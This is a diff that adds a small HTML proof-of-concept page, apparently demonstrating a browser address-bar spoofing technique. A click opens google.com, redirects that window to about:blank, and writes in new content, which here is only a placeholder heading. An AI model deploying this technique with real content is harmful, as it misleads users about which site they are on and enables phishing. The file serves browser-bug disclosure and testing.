@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Address Bar Spoof — One Click</title>
+<style>body{margin:0;padding:16px;background:#0d1117;color:#e6edf3;font:16px/1.5 system-ui}
+button{font:inherit;background:#1f6feb;color:#fff;border:0;border-radius:8px;padding:10px 14px}</style>
+</head>
+<body>
+
+<center><img src="logo.png" onclick="spoof()"></center>
+<script>
+function spoof(){
+  const w = window.open('https://www.google.com/', '_blank');
+
+  setTimeout(() => {
+    w.location.href = 'about:blank#poc';
+
+
+    setTimeout(() => {
+      w.document.write(`
+        <!doctype html><meta name="viewport" content="width=device-width,initial-scale=1">
+        <h1>Address bar spoof</h1>
+      `);
+      w.document.close();
+    }, 50);
+  }, 2500);
+}
+</script>
+</body>
+</html>
